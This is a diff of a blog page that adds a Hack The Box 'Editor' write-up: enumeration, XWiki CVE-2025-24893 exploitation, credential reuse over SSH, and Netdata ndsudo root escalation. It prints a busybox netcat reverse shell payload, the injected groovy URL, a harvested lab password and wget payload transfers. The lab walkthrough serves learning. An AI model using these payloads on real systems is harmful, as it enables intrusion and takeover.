@@ -277,7 +277,7 @@
               <a class="post-meta__author" href="/about/">Marcin</a>
               <div class="post-meta__bottom">
                 <time class="post-date" datetime=" 2026-03-24T15:01:35&#43;03:00">24 Mar, 2026</time> –
-                <span class="post-minutes">3 min read</span>
+                <span class="post-minutes">8 min read</span>
               </div>
             </div>
           </div>
@@ -306,7 +306,7 @@
 </span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 7.800/7.915/7.995/0.074 ms
 </span></span></code></pre></div><p>A successful response confirms that the host is alive and accessible on the network.</p>
 <p>Running full port scan to avoid missing non-standard services.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nmap -sS -sC -sV -p- -T4 --min-rate <span class="m">10000</span> -oN nmap_initial.txt ping Target_IP
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nmap -sS -sC -sV -p- -T4 --min-rate <span class="m">10000</span> -oN nmap_initial.txt Target_IP
 </span></span></code></pre></div><div class="table-container">
   <table>
     <tr><th>Parameter</th><th>Purpose</th></tr>
@@ -320,9 +320,9 @@
     <tr><td>-oN nmap_initial.txt</td><td>saves output in normal format to file</td></tr>
   </table>
 </div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nmap -sS -sC -sV -p- -T4 --min-rate <span class="m">10000</span> -oN nmap_initial.txt 10.129.8.106
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo nmap -sS -sC -sV -p- -T4 --min-rate <span class="m">10000</span> -oN nmap_initial.txt 10.129.8.250
 </span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-03-23 11:08 CDT
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.8.106
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.8.250
 </span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0080s latency<span class="o">)</span>.
 </span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
 </span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
@@ -368,9 +368,29 @@
 </ul>
 <hr>
 <p>Adds a local DNS entry mapping editor.htb to the target IP address, allowing proper access to the web application using its virtual host.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.8.106 editor.htb&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
-</span></span></code></pre></div><p><img src="images/posts/htb-editor-code-editor-screnshot.png" alt="Workflow"></p>
-<p><img src="https://placehold.co/1200x900" alt="Virtual Reality"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.8.250 editor.htb&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span></code></pre></div><p>The main page displays a marketing site for SimplistCode Pro</p>
+<p><img src="https://shellthisbox.io/images/posts/htb-editor-code-editor-screnshot.png" alt="Workflow"></p>
+<p>Inspecting the page source reveals a script file (index-VRKEJlit.js) located under /assets, which includes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> @license React
+</span></span><span class="line"><span class="cl"> * react.production.min.js
+</span></span></code></pre></div><p>The homepage contains a Docs link that redirects to:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://wiki.editor.htb/xwiki/bin/view/Main/
+</span></span></code></pre></div><p>The About page appears purely informational, with no indicators of hidden functionality or potential attack vectors.</p>
+<p>To identify any hidden or alternative entry points, I proceeded with virtual host enumeration.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gobuster vhost -u http://editor.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t <span class="m">100</span> -o vhosts.txt
+</span></span></code></pre></div><div class="table-container">
+  <table>
+    <tr><th>Parameter</th><th>Purpose</th></tr>
+    <tr><td>gobuster</td><td>tool used for brute-forcing directories, DNS, and virtual hosts</td></tr>
+    <tr><td>vhost</td><td>enables virtual host enumeration mode</td></tr>
+    <tr><td>-u http://editor.htb</td><td>target URL to perform enumeration against</td></tr>
+    <tr><td>-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</td><td>wordlist used to generate possible subdomains</td></tr>
+    <tr><td>--append-domain</td><td>appends the base domain (editor.htb) to each wordlist entry</td></tr>
+    <tr><td>-t 100</td><td>uses 100 concurrent threads to speed up the scan</td></tr>
+    <tr><td>-o vhosts.txt</td><td>saves results to a file for later analysis</td></tr>
+  </table>
+</div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gobuster vhost -u http://editor.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t <span class="m">100</span> -o vhosts.txt
 </span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
 </span></span><span class="line"><span class="cl">Gobuster v3.6
@@ -392,6 +412,165 @@
 </span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
 </span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
 </span></span></code></pre></div><p>Vhost enumeration revealed <code>wiki.editor.htb</code>, which redirects to <code>/xwiki</code>, confirming the presence of an XWiki application and expanding the attack surface.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;10.129.8.250 wiki.editor.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span></code></pre></div><p><img src="https://shellthisbox.io/images/posts/htb-editor-wiki-screenshot.png" alt="Workflow"></p>
+<p>The footer reveals the banner “XWiki Debian 15.10.8”, disclosing the exact version of the platform. This information will be useful for identifying potential vulnerabilities.</p>
+<p>Further research uncovered a known vulnerability (CVE-2025-24893) affecting XWiki, indicating that the target may be vulnerable.</p>
+<p><img src="https://shellthisbox.io/images/posts/htb-editor-CVE-2025-24893.png" alt="Workflow"></p>
+<p>CVE-2025-24893 – Unauthenticated Remote Code Execution in XWiki via SolrSearch Macro</p>
+<h2 id="foothold">Foothold</h2>
+<p>I used a public PoC from GitHub to exploit the vulnerability.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git clone https://github.com/gunzf0x/CVE-2025-24893.git
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat README.md 
+</span></span><span class="line"><span class="cl"><span class="c1"># CVE-2025-24893</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Remote Code Execution exploit <span class="k">for</span> <span class="o">[</span>XWiki<span class="o">](</span>https://www.xwiki.org/xwiki/bin/view/Main/WebHome<span class="o">)</span> <span class="k">for</span> versions prior to <span class="sb">`</span>15.10.11<span class="sb">`</span>, <span class="sb">`</span>16.4.1<span class="sb">`</span> and <span class="sb">`</span>16.5.0RC1<span class="sb">`</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Usage</span>
+</span></span><span class="line"><span class="cl"><span class="sb">```</span>shell
+</span></span><span class="line"><span class="cl">$ python3 CVE-2025-24893.py -t <span class="s1">&#39;http://example.com:8080&#39;</span> -c <span class="s1">&#39;busybox nc 10.10.10.10 9001 -e /bin/bash&#39;</span>
+</span></span></code></pre></div><p>The exploit was executed with a reverse shell payload, and a Netcat listener was started simultaneously to capture the incoming connection.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">python3</span> <span class="nt">CVE-2025-24893</span><span class="p">.</span><span class="nc">py</span> <span class="nt">-t</span> <span class="s1">&#39;http://wiki.editor.htb&#39;</span> <span class="nt">-c</span> <span class="s1">&#39;busybox nc 10.10.15.141 4455 -e /bin/bash&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">4455</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 CVE-2025-24893.py -t <span class="s1">&#39;http://wiki.editor.htb&#39;</span> -c <span class="s1">&#39;busybox nc 10.10.15.141 4455 -e /bin/bash&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attacking http://wiki.editor.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Injecting the payload:
+</span></span><span class="line"><span class="cl">http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media<span class="o">=</span>rss<span class="p">&amp;</span><span class="nv">text</span><span class="o">=</span>%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.15.141%204455%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command executed
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">~Happy Hacking
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">4455</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4455</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.15.141<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.8.250<span class="o">]</span> <span class="m">56758</span>
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">jetty
+</span></span><span class="line"><span class="cl">logs
+</span></span><span class="line"><span class="cl">start.d
+</span></span><span class="line"><span class="cl">start_xwiki.bat
+</span></span><span class="line"><span class="cl">start_xwiki_debug.bat
+</span></span><span class="line"><span class="cl">start_xwiki_debug.sh
+</span></span><span class="line"><span class="cl">start_xwiki.sh
+</span></span><span class="line"><span class="cl">stop_xwiki.bat
+</span></span><span class="line"><span class="cl">stop_xwiki.sh
+</span></span><span class="line"><span class="cl">webapps
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">xwiki
+</span></span></code></pre></div><p>To improve shell stability and gain a fully interactive session, a pseudo-terminal (PTY) was spawned using Python. I am now logged in as the xwiki user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">xwiki@editor:/usr/lib/xwiki-jetty$ ls
+</span></span><span class="line"><span class="cl">------
+</span></span><span class="line"><span class="cl">cache				jetty-web.xml  version.properties
+</span></span><span class="line"><span class="cl">classes				lib	       web.xml
+</span></span><span class="line"><span class="cl">fonts				observation    xwiki.cfg
+</span></span><span class="line"><span class="cl">hibernate.cfg.xml		portlet.xml    xwiki-locales.txt
+</span></span><span class="line"><span class="cl">jboss-deployment-structure.xml	sun-web.xml    xwiki.properties
+</span></span><span class="line"><span class="cl">xwiki@editor:/usr/lib/xwiki/WEB-INF$ 
+</span></span></code></pre></div><p>The file <code>hibernate.cfg.xml</code> contained the password <code>theEd1t0rTeam99</code>.`</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&lt;property <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;hibernate.connection.username&#34;</span>&gt;xwiki&lt;/property&gt;
+</span></span><span class="line"><span class="cl">&lt;property <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;hibernate.connection.password&#34;</span>&gt;theEd1t0rTeam99&lt;/property&gt;
+</span></span></code></pre></div><p>Inspecting /etc/passwd allowed me to enumerate valid users on the system, revealing a potential target account: oliver.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">xwiki@editor:/etc$ cat passwd
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
+</span></span><span class="line"><span class="cl">_laurel:x:995:995::/var/log/laurel:/bin/false
+</span></span></code></pre></div><p>Using the discovered credentials, I attempted to authenticate to the system via SSH as oliver:</p>
+<p>password: <code>theEd1t0rTeam99</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh oliver@editor.htb
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;editor.htb (10.129.231.23)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
+</span></span></span><span class="line"><span class="cl"><span class="s1">This key is not known by any other names.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>editor.htb<span class="s1">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span class="line"><span class="cl"><span class="s1">oliver@editor.htb&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.5 LTS <span class="o">(</span>GNU/Linux 5.15.0-151-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/pro
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> System information as of Wed Mar <span class="m">25</span> 10:41:49 PM UTC <span class="m">2026</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.34              Processes:             <span class="m">230</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   64.5% of 7.28GB   Users logged in:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 43%               IPv4 address <span class="k">for</span> eth0: 10.129.231.23
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Expanded Security Maintenance <span class="k">for</span> Applications is not enabled.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">4</span> updates can be applied immediately.
+</span></span><span class="line"><span class="cl">To see these additional updates run: apt list --upgradable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">4</span> additional security updates can be applied with ESM Apps.
+</span></span><span class="line"><span class="cl">Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.
+</span></span><span class="line"><span class="cl">To check <span class="k">for</span> new updates run: sudo apt update
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Wed Mar <span class="m">25</span> 22:41:50 <span class="m">2026</span> from 10.10.15.141
+</span></span><span class="line"><span class="cl">oliver@editor:~$ 
+</span></span></code></pre></div><p>The authentication was successful, granting SSH access as oliver. This provided a stable and interactive shell on the target system, marking a successful foothold.</p>
+<p>The user flag was successfully obtained.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">oliver@editor:~$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">oliver@editor:~$ cat user.txt
+</span></span><span class="line"><span class="cl">***********************
+</span></span><span class="line"><span class="cl">oliver@editor:~$ 
+</span></span></code></pre></div><p>To identify potential privilege escalation vectors, I searched for SUID binaries across the system. This revealed several entries, including ndsudo, which is associated with Netdata and stood out as a potential target.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
+</span></span><span class="line"><span class="cl">/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
+</span></span><span class="line"><span class="cl">/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
+</span></span><span class="line"><span class="cl">/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+</span></span><span class="line"><span class="cl">/opt/netdata/usr/libexec/netdata/plugins.d/ioping
+</span></span><span class="line"><span class="cl">/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
+</span></span><span class="line"><span class="cl">/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/su
+</span></span><span class="line"><span class="cl">/usr/bin/umount
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/fusermount3
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/mount
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">/usr/libexec/polkit-agent-helper-1
+</span></span></code></pre></div><p>Out of the identified SUID binaries, ndsudo was the most interesting. I then checked the Netdata version.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">oliver@editor:~$ /opt/netdata/usr/sbin/netdata -v
+</span></span><span class="line"><span class="cl">netdata v1.45.2
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2>
+<p>CVE-2024-32019 is a local privilege escalation vulnerability in Netdata’s SUID helper ndsudo. It allows a local user to execute arbitrary commands as root via PATH hijacking, as the binary resolves commands using the user-controlled PATH. The issue affects specific Netdata versions and is rated CVSS 8.8 (High).</p>
+<p>The exploit was downloaded to the attacker’s machine due to the target lacking internet access.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git clone https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC.git
+</span></span></code></pre></div><p>Compile the payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc -static payload.c -o nvme -Wall -Werror -Wpedantic
+</span></span></code></pre></div><p>To facilitate file transfer to the target, the files were hosted locally using a Python HTTP server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 -m http.server <span class="m">8000</span>
+</span></span></code></pre></div><p>On the target machine, both files were then downloaded using <code>wget</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">wget http://10.10.15.141:8000/CVE-2024-32019.sh
+</span></span><span class="line"><span class="cl">wget http://10.10.15.141:8000/nvme
+</span></span></code></pre></div><p>Set execution permissions on the exploit so it can be run on the system:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">chmod +x CVE-2024-32019.sh
+</span></span></code></pre></div><p>As a final step, I executed the exploit.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">oliver@editor:~$ ./CVE-2024-32019.sh
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> ndsudo found at: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> File <span class="s1">&#39;nvme&#39;</span> found in the current directory.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Execution permissions granted to ./nvme
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running ndsudo with modified PATH:
+</span></span><span class="line"><span class="cl">root@editor:/home/oliver# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@editor:/# <span class="nb">cd</span> root/
+</span></span><span class="line"><span class="cl">root@editor:/root# ls
+</span></span><span class="line"><span class="cl">root.txt  scripts  snap
+</span></span><span class="line"><span class="cl">root@editor:/root# cat root.txt
+</span></span><span class="line"><span class="cl">****************
+</span></span><span class="line"><span class="cl">root@editor:/root# 
+</span></span></code></pre></div><p>This machine demonstrates the importance of thorough enumeration, especially identifying additional attack surfaces such as virtual hosts and exposed services. It also highlights how version disclosure can lead directly to known vulnerabilities and exploitation. Finally, it reinforces key post-exploitation skills, including credential discovery and privilege escalation via misconfigured SUID binaries.</p>
+<p>I hope you enjoyed my first write-up.</p>
 
         </div>
       </article>
